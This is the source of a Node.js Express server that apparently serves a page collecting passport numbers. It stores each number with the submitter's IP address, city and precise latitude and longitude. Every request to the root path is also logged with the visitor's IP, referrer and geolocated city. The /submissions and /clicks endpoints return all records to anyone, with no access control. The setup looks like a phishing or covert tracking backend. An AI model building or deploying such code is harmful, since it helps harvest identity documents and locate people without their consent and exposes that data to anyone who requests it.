const express = require('express');
const sqlite3 = require('sqlite3');
const path = require('path');
const fetch = require('node-fetch'); // Add this for location lookup

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('data.db', (err) => {
    if (err) console.error(err);
    console.log('Connected to database');
});

// Create tables
db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    passport TEXT,
    ip TEXT,
    city TEXT,
    region TEXT,
    country TEXT,
    latitude REAL,
    longitude REAL,
    timestamp TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    referrer TEXT,
    city TEXT,
    country TEXT,
    timestamp TEXT
)`);

// Middleware to track all requests to "/"
app.use('/', async (req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const referrer = req.headers['referer'] || 'Direct';

    // Fetch location data
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await response.json();

        db.run(`INSERT INTO clicks (ip, referrer, city, country, timestamp) 
                VALUES (?, ?, ?, ?, ?)`,
            [
                ip,
                referrer,
                locationData.city || 'Unknown',
                locationData.country_name || 'Unknown',
                new Date().toISOString()
            ],
            (err) => {
                if (err) console.error('Error saving click:', err);
            });
    } catch (error) {
        console.error('Error fetching location:', error);
    }
    next(); // Continue to serve the page
});

// Existing submission endpoint
app.post('/save', (req, res) => {
    const { passport, ip, location, timestamp } = req.body;
    db.run(`INSERT INTO submissions 
        (passport, ip, city, region, country, latitude, longitude, timestamp) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [passport, ip, location.city, location.region, location.country, location.latitude, location.longitude, timestamp],
        (err) => {
            if (err) {
                console.error(err);
                res.status(500).send('Error saving data');
            } else {
                res.status(200).send('Data saved');
            }
        });
});

// Existing submissions viewer endpoint
app.get('/submissions', (req, res) => {
    db.all('SELECT * FROM submissions', [], (err, rows) => {
        if (err) res.status(500).send('Error retrieving data');
        else res.json(rows);
    });
});

// New endpoint for click data
app.get('/clicks', (req, res) => {
    db.all('SELECT * FROM clicks', [], (err, rows) => {
        if (err) res.status(500).send('Error retrieving clicks');
        else res.json(rows);
    });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});